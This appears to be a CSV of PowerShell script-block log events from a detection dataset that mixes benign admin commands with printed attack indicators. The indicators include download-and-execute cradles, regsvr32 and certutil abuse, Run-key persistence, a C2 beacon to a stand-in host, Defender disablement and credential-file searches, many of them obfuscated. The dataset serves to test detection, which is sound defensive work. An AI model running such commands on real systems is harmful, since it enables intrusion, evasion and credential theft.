sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-094,PST-094,mapped,94,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722126,2026-07-17T09:36:10.0560325Z,4104,a58bf74f-7320-4d45-8ec1-7334bbeff2b5,1,1,exact,104bae0389770468fdbd2983b90b34c67cf7e89f6d05f57f7292a47eaa046ae8,"$sampleId='PST-094'; $encoded='SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-095,PST-095,mapped,95,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722140,2026-07-17T09:36:10.3940794Z,4104,75b5eb4f-9592-4991-823d-eb4ae600ebe8,1,1,exact,0bac0933518a588e93aa5b20eb383f46c876b6da1ba0c43261f289106ae1295d,"$sampleId='PST-095'; $json = '{""server"":""srv-file-01"",""mode"":""audit"",""enabled"":true}'; $json | ConvertFrom-Json | Select-Object server, mode; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-096,PST-096,mapped,96,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722144,2026-07-17T09:36:10.7268127Z,4104,8fdaed40-a571-4fca-a952-ce0a53b89746,1,1,exact,373aa9a3383a8df24bb0f676e7d7deaccd3e78f03294a558a2b987ceb8a6f789,"$sampleId='PST-096'; 'alpha','beta','gamma' | ForEach-Object { Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($_))) } | Select-Object -First 2 Algorithm, Hash; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-097,PST-097,mapped,97,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722149,2026-07-17T09:36:11.0870914Z,4104,353cea9d-cd1e-420e-b85e-bbaba2ce6ae1,1,1,exact,5d50b001cbe05864fcbbed25e73d053d3c1e512d81bba075aff4a36515a63e42,"$sampleId='PST-097'; 'routine maintenance script' | Measure-Object -Character; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-098,PST-098,mapped,98,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722152,2026-07-17T09:36:11.4150164Z,4104,008ab309-01a8-4b29-8c09-7caee40d04c2,1,1,exact,53e126a5aaf92f8b528a6cdaad57875bb4ef854fc1f7d7e98949efe1f16c5776,"$sampleId='PST-098'; $name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-099,PST-099,mapped,99,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722166,2026-07-17T09:36:11.7736131Z,4104,9a5cbedc-706e-425d-ad72-3189b455bcba,1,1,exact,882078ed8a24c8d16424b22a29e9f36256c3d63e889aa47df48c00218547baab,"$sampleId='PST-099'; $note = ('administrative inventory and compliance audit ' * 18); Write-Output $note; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-100,PST-100,mapped,100,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722167,2026-07-17T09:36:12.1021531Z,4104,ca5ee854-25d8-4f83-816e-e12bcc4a3be5,1,1,exact,f48a95f4681a5e74b559780d5aae04916d3cce64033c77045b71ed6b42fb14bb,"$sampleId='PST-100'; $indicator='regsvr32.e' + 'xe /s' + ' /n /u /i:' + 'https://re' + 'g.exam' + 'ple.in' + 'valid/a.' + 'sct s' + 'crobj.' + 'dll'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-101,PST-101,mapped,101,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722170,2026-07-17T09:36:12.4434066Z,4104,e1f243b8-d8b8-48b8-8a4b-2a9df77feda7,1,1,exact,19546b36ca0ac8328bf00c7611e0f6193f04598ea06196e3137d70fa145e0f29,"$sampleId='PST-101'; $encoded='YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-102,PST-102,mapped,102,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722175,2026-07-17T09:36:12.7828072Z,4104,e96daaae-4cc2-4b2a-80a6-aa572cb90b54,1,1,exact,7b6ab853c04dfed7de2aeeab27e5e64d77feac1357a5f6c387105e322270b0a4,"$sampleId='PST-102'; Get-Process | Select-Object -First 3 Name, Id | ConvertTo-Csv -NoTypeInformation; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-103,PST-103,mapped,103,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722179,2026-07-17T09:36:13.1443402Z,4104,eaeaedb0-9114-46c1-aca4-7c59d189e980,1,1,exact,268fd486d66965f41ca1d485d630a763b32ef12578e8fcf4d35ad23925c43a6e,"$sampleId='PST-103'; $encoded='SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgACcAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABWAHcAQgB5AEEARwBrAEEAZABBAEIAbABBAEMAMABBAFQAdwBCADEAQQBIAFEAQQBjAEEAQgAxAEEASABRAEEASQBBAEEAbgBBAEYAUQBBAFMAQQBCAEYAQQBGAE0AQQBTAFEAQgBUAEEAQwAwAEEAUwBRAEIATwBBAEUAVQBBAFUAZwBCAFUAQQBDAGMAQQAgAH0A'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-104,PST-104,mapped,104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722183,2026-07-17T09:36:13.4673793Z,4104,baf587ee-37b2-44b7-a32f-1922ea60091b,1,1,exact,92e4c83754be17812057ca795f71baf7e851ddc5c10a294f34375bea641146c1,"$sampleId='PST-104'; $indicator='rundll32.exe C:\__THESIS_INERT__\stage.dll,EntryPoint'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-105,PST-105,mapped,105,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722197,2026-07-17T09:36:13.7927015Z,4104,88239602-f4f0-4e2a-98e7-0064230d43a7,1,1,exact,a4a8692152bd9585d9c15d481b56aec994ed02006b6c2b4bc63c2ca25f5e4eb8,"$sampleId='PST-105'; $line = 'INFO 2026-06-28 user=admin action=read status=ok'; [regex]::Matches($line, 'user=\w+|status=\w+') | ForEach-Object Value; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-106,PST-106,mapped,106,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722199,2026-07-17T09:36:14.1203677Z,4104,200cd131-b9d8-4f8b-a83e-869ecb29d764,1,1,exact,cbf62895087b7293726e0a07f489f777e9074e6122764eb9667936470b5d5152,"$sampleId='PST-106'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-107,PST-107,mapped,107,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722203,2026-07-17T09:36:14.4485483Z,4104,e784965c-62eb-496b-abc9-aab966827dc8,1,1,exact,33c55ab6522e67f6e0a233e8b9bebc5b23ea1ba62e737d38dd32dcb61ce523f8,"$sampleId='PST-107'; Get-TimeZone | Select-Object Id, DisplayName; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-108,PST-108,mapped,108,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722207,2026-07-17T09:36:14.7735322Z,4104,8ea0bcee-8d6b-4c9b-877c-2c8fac05ad12,1,1,exact,7858390a06d597cbf6989a41822351c0e2324daa5f4748207cd6ac6d78c906d9,"$sampleId='PST-108'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-109,PST-109,mapped,109,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722232,2026-07-17T09:36:15.1631432Z,4104,00d0982d-a8b5-4d2b-b8fa-44bb1702c23f,1,1,exact,1ed61af6b2843920ad7b0ec61de6c9b97a327c0329892c0421ef855980296a65,"$sampleId='PST-109'; Get-WinEvent -ListProvider Microsoft-Windows-PowerShell | Select-Object Name, LogLinks; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-110,PST-110,mapped,110,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722234,2026-07-17T09:36:15.5068885Z,4104,f72fd631-62aa-4aca-9c1e-0ce1a9780920,1,1,exact,49e25a6724eb1714263ac87b611df1c9d946154b49e5994d9e12265e3428dd2b,"$sampleId='PST-110'; $indicator='STaRT-bITStrANSFER -sOurce ''htTPS://BiTS.ExaMpLE.InvaLiD/pAylOAD.BiN'' -DeSTiNAtiON ''$env:TeMp\caChe.bin'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-111,PST-111,mapped,111,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722237,2026-07-17T09:36:15.8672246Z,4104,5d3663db-b63e-4bfd-88ad-280735821991,1,1,exact,0921cd4a1126b6e207261bdf9bb3dfa7c0f019b7af8033088f6b0344dbdd803f,"$sampleId='PST-111'; $indicator='REGsvr32.exE /s /N /U /I:HttpS://ReG.ExAmpLe.inVAliD/A.sCt sCrobj.dll'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-112,PST-112,mapped,112,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722241,2026-07-17T09:36:16.2121035Z,4104,d5a9cfed-489a-47df-9875-8e6cbb65e7f3,1,1,exact,ebca1d9f568bddae5db228117c9c1c6ad60ae027e4ab73394793f73d1b342144,"$sampleId='PST-112'; $indicator='nEW-iTeMpROPerTy -PAtH ''HkcU:\soFTwaRE\MIcrOsofT\wiNDows\curRENTVersIoN\rUn'' -naME ''upDAteChecK'' -VAlue ''powErsHelL.eXe -wINdOWsTYLe hiddEn -FiLE c:\__ThEsIS_IneRT__\sTaGE.PS1'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-113,PST-113,mapped,113,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722242,2026-07-17T09:36:16.5517874Z,4104,4371e8ae-bb5b-4300-9ddb-737bdddd4d02,1,1,exact,15c38532d064735226769ddd6f6ae7b17f2fd0d8769b51f9dae60a1708106852,"$sampleId='PST-113'; $indicator='[System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-114,PST-114,mapped,114,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722246,2026-07-17T09:36:16.8921164Z,4104,ce518e27-f1ba-46c7-b276-514b4ecbd3b2,1,1,exact,0ebfd40258a5d925b06f425e200764b9447f8ecd134312700395359006e04429,"$sampleId='PST-114'; $parts=@('GEt-cLI','PB`OArD ','-rAw ','| Co','`nVE','rTTo-Js','on -CO`Mp','ReS','s'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-115,PST-115,mapped,115,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722250,2026-07-17T09:36:17.2189993Z,4104,fe48bdf8-2a54-4a39-a00c-1b5f689a117f,1,1,exact,90f66f734ae46d54c95e3a121e9f2377362537132461ddc26e912c517bdc0542,"$sampleId='PST-115'; Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object TaskName -like '*Update*' | Select-Object -First 5 TaskName, State; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-116,PST-116,mapped,116,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722296,2026-07-17T09:36:18.3594621Z,4104,742c99e0-cae1-4292-ab58-85761324f6b4,1,1,exact,d75eec88bdffe13760c2ae6a639cbd96e92832187ccadaf37b01ac05c4f86160,"$sampleId='PST-116'; Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-117,PST-117,mapped,117,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722427,2026-07-17T09:36:21.0455286Z,4104,3f3ee02a-fd51-4446-ad9f-d3cba8717bbc,1,1,exact,2217be192ba876496b26a27723d1315b2374e0c422b8e679a3710e8ab443e35d,"$sampleId='PST-117'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-118,PST-118,mapped,118,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722431,2026-07-17T09:36:21.3723583Z,4104,edd276e0-7122-4b23-a980-2bec139d4cb2,1,1,exact,96fc17ff3db2a49c8c81eecffaf64eb749ee138dd089cf8c5aca7fd76cc286d7,"$sampleId='PST-118'; powercfg /L; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-119,PST-119,mapped,119,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722445,2026-07-17T09:36:21.7546500Z,4104,f0d2f4ba-64a5-4122-965a-3983df454beb,1,1,exact,937e8081ea8572195ac65966bdc265aa6fff0e9813037b8abf6cc7cfdb255fb7,"$sampleId='PST-119'; [xml]$xml = '<inventory><host name=""ws-01""><state>ok</state></host></inventory>'; $xml.inventory.host.state; Write-Output 'hard benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-120,PST-120,mapped,120,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722448,2026-07-17T09:36:22.1061534Z,4104,fb546f54-1b5a-4f17-9911-bfabbce2e6c7,1,1,exact,35edd5ecd8c960c6d80410833a91e3ddb1ebf7f821ff738a125af694f758bdfb,"$sampleId='PST-120'; $encoded='RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-121,PST-121,mapped,121,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722452,2026-07-17T09:36:22.4398308Z,4104,8694f25b-9c8b-47d2-a04e-6d4a85e2b05e,1,1,exact,7bfeec2b5707e77a27895cb593b69be5dcc6d94180ef4f64dc67263299bc61cd,"$sampleId='PST-121'; $indicator='Get-Ite' + 'mPrope' + 'rty -Path' + ' ''HKL' + 'M:\Softw' + 'are\Microso' + 'ft\Win' + 'dows\Curre' + 'ntVersion\Uni' + 'nstall\*'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-122,PST-122,mapped,122,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722467,2026-07-17T09:36:22.7711148Z,4104,b7b5f1f8-293b-40ff-83da-a354076a0ba8,1,1,exact,b267cefdadcbd4a69c1c85c686c7b611bcbe0c858297fbc0fff79013de205c6d,"$sampleId='PST-122'; $indicator='$profile=@{Sleep=60000;Jitter=0.25;UserAgent=''Mozilla/5.0'';Uri=''/api/v1/status''}; Invoke-WebRequest -Uri ''https://c2.example.invalid/api/v1/status'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-123,PST-123,mapped,123,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722468,2026-07-17T09:36:23.1092787Z,4104,c3d9b757-0bd0-4093-bacd-4d4e7b60c53d,1,1,exact,09ae99b09a37b273593ee647478cb4b0d7f70942c4cd8b990b9a7be26aaaace0,"$sampleId='PST-123'; $settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-124,PST-124,mapped,124,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722509,2026-07-17T09:36:24.1226108Z,4104,1e102a03-017e-4ff7-b71b-09d3dc1caad4,1,1,exact,a715a0bf0d68db0a758a695664ea2424af61d06973d9217264f3455d1cf1e838,"$sampleId='PST-124'; $parts=@('Invok','e-WebR','equest',' -Uri ''ht','tps://file','s.example','.invalid/u','pdate.bin'' ','-OutF','ile ''$','env:TEMP\upda','te.bin'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-125,PST-125,mapped,125,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722512,2026-07-17T09:36:24.4488386Z,4104,e91554ce-d24d-4586-ba2f-e7490774b484,1,1,exact,9f2a8b9042d151718079398f98451d99e066fb00c1697b07cf969ae8f565a25f,"$sampleId='PST-125'; Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-126,PST-126,mapped,126,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722555,2026-07-17T09:36:27.3870257Z,4104,cfd343dc-86db-4704-bbcf-59ce61b9179d,1,1,exact,40918589f1133ace2942e962f52bd8d2327f19eec17cef35afccaf0c34d4fdc3,"$sampleId='PST-126'; 'alpha','gamma','beta' | Sort-Object; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-127,PST-127,mapped,127,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722558,2026-07-17T09:36:27.7130023Z,4104,4f2cda98-48af-4228-88fc-3951f8145d56,1,1,exact,4175d9bca30231f04958b638b28a968706a56e1e1e128fa030a215dcdb2a6469,"$sampleId='PST-127'; $indicator='Get-Clipboard -Raw | ConvertTo-Json -Compress'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-128,PST-128,mapped,128,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722562,2026-07-17T09:36:28.0446512Z,4104,aded2e90-2548-4e26-8901-1529258811e2,1,1,exact,f19c1d38a4c61c5c173cbaacb5a9897dc587831c37580fed6d223e71c45ce5bf,"$sampleId='PST-128'; $indicator='powershell.exe -' + 'NoProfile -Windo' + 'wStyle Hid' + 'den -EncodedComm' + 'and VwByAGkAdAB' + 'lAC0ATwB1AHQAcA' + 'B1AHQAIAAn' + 'AFQASABFAFMASQ' + 'BTAC0ASQBOAE' + 'UAUgBUACcA'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-129,PST-129,mapped,129,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722575,2026-07-17T09:36:28.3682314Z,4104,9e74730d-0c68-4dd8-b5a8-c059e98b3353,1,1,exact,bd638ef0d93b0de0fa71e0d885b24d221cd8333875d48671d3a8d28c34da53dd,"$sampleId='PST-129'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-130,PST-130,mapped,130,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722577,2026-07-17T09:36:28.7065383Z,4104,fb403ee3-2273-4195-be7a-1b924c78b9db,1,1,exact,78b4de8d2c86ea9d838ca6368ea29dd9ffbe875da73b6964fd6e6f54354c0981,"$sampleId='PST-130'; $indicator='$cmd=(''Inv''+''oke-Expression''); & (Get-Command $cmd) ""Write-Output ''THESIS-INERT''""'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-131,PST-131,mapped,131,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722580,2026-07-17T09:36:29.0286188Z,4104,dfc518cb-e013-43d9-b342-1dcdeb401348,1,1,exact,44de21467c0fcce477ee71ae43c8bec178b4de1d169407f910939446e7df7770,"$sampleId='PST-131'; $indicator='Invoke-Command -Com' + 'puterName ''host.ex' + 'ample.invalid'' -Scrip' + 'tBlock { powershe' + 'll.exe -NoProfile -E' + 'ncodedCommand Vw' + 'ByAGkAdABlAC0AT' + 'wB1AHQAcAB1AHQAIAAn' + 'AFQASABFAFMASQBTAC0AS' + 'QBOAEUAUgBUACcA' + ' }'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-132,PST-132,mapped,132,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722585,2026-07-17T09:36:29.3491328Z,4104,c31a0956-50fa-4e15-8870-9b3ed693ad84,1,1,exact,357d77d8a1d63f321b3c6c03e47b3ebbfe5255a40dfd854f61b86da19e0d464f,"$sampleId='PST-132'; $indicator='Set-Mp`Pr`eference -Exclusi`on`Path ''C:\__THES`IS_INERT__'' -DisableReal`timeMo`nitoring $true'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-133,PST-133,mapped,133,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722587,2026-07-17T09:36:29.6907502Z,4104,94da08a0-5425-4d1b-bb7e-5d33ba6a7603,1,1,exact,d3788a244ed0c3e9e735d394637727a258432ebac2950596b78e2846ee92f43f,"$sampleId='PST-133'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-134,PST-134,mapped,134,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722591,2026-07-17T09:36:30.0517718Z,4104,f9895679-6c96-4db0-9fdd-b5b48bec41a3,1,1,exact,b056961275da7237d15b1b21055d5e07228e58d7ad0bae3c4c894de184f4f268,"$sampleId='PST-134'; $indicator='IEX (New-Ob`ject Net.Web`Client).Downl`oadSt`ring(''https://stage.example.invalid/bootst`rap.ps1'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-135,PST-135,mapped,135,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722606,2026-07-17T09:36:30.3944007Z,4104,370f0418-1718-481c-af00-0fd81570b99e,1,1,exact,8c43daa2f0affd93bd9be4b1d34896aa0472a163e99baaf02f5f606d941818d6,"$sampleId='PST-135'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-136,PST-136,mapped,136,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722608,2026-07-17T09:36:30.7659894Z,4104,d080c5de-cf2b-4303-8c76-ec16ecac9cb7,1,1,exact,ceda6d7095b9be8ca76b7b933c632106569e0a7aa2583b01860f927931f87ebc,"$sampleId='PST-136'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-137,PST-137,mapped,137,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,722612,2026-07-17T09:36:31.0933034Z,4104,79e799f7-72df-4fdd-beb3-a7f75c85ccdc,1,1,exact,604694259f006f02c791fc952e50d4d05830af42c3cadd9839b87e35689ad7f2,"$sampleId='PST-137'; $indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
